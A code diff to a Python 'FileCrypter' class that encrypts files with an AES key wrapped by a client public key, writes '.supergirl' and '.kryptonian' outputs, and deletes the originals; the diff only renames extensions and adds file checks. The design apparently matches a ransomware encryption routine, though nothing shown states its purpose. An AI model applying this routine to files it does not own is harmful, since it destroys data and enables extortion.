@@ -28,6 +28,9 @@ class FileCrypter:
         return plaintext.rstrip(b"\0")
 
     def encrypt_file(self, file_name, client_pub_key):
+        if not os.path.isfile(file_name):
+            return
+
 
         public_key = serialization.load_ssh_public_key(
             bytes(client_pub_key, 'utf-8'),
@@ -51,20 +54,27 @@ class FileCrypter:
         with open(file_name, 'rb') as fo:
             plaintext = fo.read()
         enc = self.encrypt(plaintext, self.key)
-        with open(file_name + ".enc", 'wb') as fo:
+
+        with open(file_name + ".supergirl", 'wb') as fo:
             fo.write(enc)
 
-        with open(file_name + ".enc.info", 'wb') as info:
+        with open(file_name + ".kryptonian", 'wb') as info:
             info.write(cipher)
         os.remove(file_name)
 
     def decrypt_file(self, file_name, privateKeyStr):
+        if not os.path.isfile(file_name):
+            return
+
+
         private_key = serialization.load_pem_private_key(
             bytes(privateKeyStr, 'utf-8'),
             password=None,
             backend=default_backend()
         )
-        aes_line = open(file_name + '.info', 'rb').readline().strip()
+
+        tmp_name = file_name[:-10]
+        aes_line = open(tmp_name + '.kryptonian', 'rb').readline().strip()
         aes_line = base64.b64decode(aes_line)
 
         aes_iv_clear = private_key.decrypt(
@@ -82,7 +92,7 @@ class FileCrypter:
             ciphertext = fo.read()
 
         dec = self.decrypt(ciphertext, aes_iv_clear)
-        with open(file_name[:-4], 'wb') as fo:
+        with open(file_name[:-10], 'wb') as fo:
             fo.write(dec)
         os.remove(file_name)
-        os.remove(file_name + '.info')
+        os.remove(tmp_name + '.kryptonian')
